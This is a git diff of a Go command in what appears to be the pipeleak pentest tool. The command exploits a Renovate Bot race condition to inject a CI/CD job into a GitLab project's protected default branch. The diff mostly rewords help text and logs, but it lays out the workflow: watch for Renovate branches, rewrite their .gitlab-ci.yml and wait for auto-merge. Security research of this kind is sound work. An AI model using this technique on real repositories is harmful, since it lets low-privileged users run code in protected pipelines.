@@ -2,7 +2,6 @@ package renovate
 
 import (
 	"regexp"
-	//"time"
 
 	"github.com/CompassSecurity/pipeleak/cmd/gitlab/util"
 	"github.com/CompassSecurity/pipeleak/helper"
@@ -19,8 +18,9 @@ var (
 
 func NewPrivescCmd() *cobra.Command {
 	privescCmd := &cobra.Command{
-		Use:   "privesc [no options!]",
-		Short: "Create a PoC for Renovate Race Condition Privilege Escalation exploitation",
+		Use:   "privesc",
+		Short: "Inject a malicious CI/CD Job into the protected default branch abusing Renovate Bot's access",
+		Long:  "Inject a job into the CI/CD pipeline of the project's default branch by adding a commit (race condition) to a Renovate Bot branch, which is then auto-merged into the main branch. Assumes the Renovate Bot has owner/maintainer access whereas you only have developer access. See https://blog.compass-security.com/2025/05/renovate-keeping-your-updates-secure/",
 		Run:   Exploit,
 	}
 	privescCmd.Flags().StringVarP(&renovateBranchesRegex, "renovateBranchesRegex", "b", "renovate/.*", "The branch name regex expression to match the Renovate Bot branch names (default: 'renovate/.*')")
@@ -65,12 +65,9 @@ func Exploit(cmd *cobra.Command, args []string) {
 
 	checkDefaultBranchProtections(git, project, projectAccessLevel)
 
-	log.Info().Str("branch", project.DefaultBranch).Any("currentAccessLevel", projectAccessLevel).Msg("Default branch is protected, proceeding with exploit")
-
 	log.Info().Msg("Monitoring for new Renovate Bot branches to exploit")
 	branch := monitorBranches(git, project, regex)
 	cicd := getBranchCiCdYml(git, project, *branch)
-
 	log.Info().Str("branch", branch.Name).Msg("Modifying CI/CD configuration")
 	cicd["pipeleak-renovate-privesc"] = ci.JobConfig{
 		Stage:        "test",
@@ -155,8 +152,6 @@ func monitorBranches(git *gogitlab.Client, project *gogitlab.Project, regex *reg
 				return branch
 			}
 		}
-
-		//time.Sleep(5 * time.Second)
 	}
 }
 
@@ -170,7 +165,6 @@ func getBranchCiCdYml(git *gogitlab.Client, project *gogitlab.Project, branch go
 		log.Fatal().Stack().Err(err).Str("branch", branch.Name).Msg("Failed to retrieve .gitlab-ci.yml file from Renovate branch")
 	}
 
-	log.Debug().Str(".gitlab-ci.yml", string(rawYml)).Msg("Unmarshalling CI/CD configuration of the Renovate branch")
 	var ciCdConfig map[string]interface{}
 	err = yaml.Unmarshal(rawYml, &ciCdConfig)
 	if err != nil {
@@ -181,7 +175,7 @@ func getBranchCiCdYml(git *gogitlab.Client, project *gogitlab.Project, branch go
 }
 
 func updateCiCdYml(yml map[string]interface{}, git *gogitlab.Client, project *gogitlab.Project, branch gogitlab.Branch) {
-	log.Info().Str("branch", branch.Name).Msg("Updating .gitlab-ci.yml file in Renovate branch")
+	log.Info().Str("branch", branch.Name).Msg("Modifying .gitlab-ci.yml file in Renovate branch")
 	cicdYaml, err := yaml.Marshal(yml)
 	if err != nil {
 		log.Fatal().Stack().Err(err).Msg("Failed to marshal CI/CD configuration for the Renovate branch")
@@ -197,12 +191,13 @@ func updateCiCdYml(yml map[string]interface{}, git *gogitlab.Client, project *go
 		log.Fatal().Stack().Err(err).Str("branch", branch.Name).Msg("Failed to update .gitlab-ci.yml file in Renovate branch")
 	}
 
-	log.Info().Str("branch", branch.Name).Any("fileinfo", fileInfo).Msg("Updated .gitlab-ci.yml file in Renovate branch")
+	log.Info().Str("branch", branch.Name).Any("fileinfo", fileInfo).Msg("Updated remote .gitlab-ci.yml file in Renovate branch")
 }
 
 func listBranchMRs(git *gogitlab.Client, project *gogitlab.Project, branch gogitlab.Branch) {
 	opts := &gogitlab.ListProjectMergeRequestsOptions{
 		SourceBranch: gogitlab.Ptr(branch.Name),
+		TargetBranch: gogitlab.Ptr(project.DefaultBranch),
 	}
 
 	mergeRequests, _, err := git.MergeRequests.ListProjectMergeRequests(project.ID, opts)
